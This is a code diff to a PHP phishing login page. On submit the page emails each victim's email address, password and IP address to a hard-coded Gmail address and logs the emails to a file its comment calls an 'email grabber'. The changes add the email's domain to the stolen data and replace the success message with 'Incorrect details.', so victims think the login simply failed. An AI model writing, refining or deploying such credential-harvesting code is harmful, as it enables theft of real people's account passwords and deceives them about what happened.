@@ -6,19 +6,23 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Basic validation
     if (!empty($email) && !empty($password) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        // Extract domain from email
+        $email_parts = explode('@', $email);
+        $domain = isset($email_parts[1]) ? $email_parts[1] : '';
+
         // Send login details to your email
         $to = "jc4717287@gmail.com"; // Change to your email address
         $subject = "New Login Attempt";
-        $message = "Email: $email\nPassword: $password\nIP: " . $_SERVER['REMOTE_ADDR'];
+        $message = "Email: $email\nDomain: $domain\nPassword: $password\nIP: " . $_SERVER['REMOTE_ADDR'];
         $headers = "From: noreply@example.com\r\n";
 
         mail($to, $subject, $message, $headers);
 
-        // Optionally, store the email in a file (email grabber)
-        file_put_contents("emails.txt", $email . PHP_EOL, FILE_APPEND);
+        // Optionally, store the email and domain in a file
+        file_put_contents("emails.txt", $email . " | " . $domain . PHP_EOL, FILE_APPEND);
 
-        // Redirect or show success message
-        $success = "Login details submitted successfully.";
+        // Show success message
+        $success = "Incorrect details.";
     } else {
         $error = "Please enter a valid email and password.";
     }
@@ -82,7 +86,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         .error {
             margin-bottom: 1rem;
             color: red;
-            text-align: center;
+            text-align: center
         }
         @media (max-width: 400px) {
             .login-container {
@@ -99,7 +103,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <?php elseif (!empty($error)): ?>
             <div class="error"><?php echo htmlspecialchars($error); ?></div>
         <?php endif; ?>
-        <form method="post" action="">
+        <form method="post" action="login.php">
             <div class="form-group">
                 <label for="email">Email:</label>
                 <input type="email" name="email" id="email" required autocomplete="username">
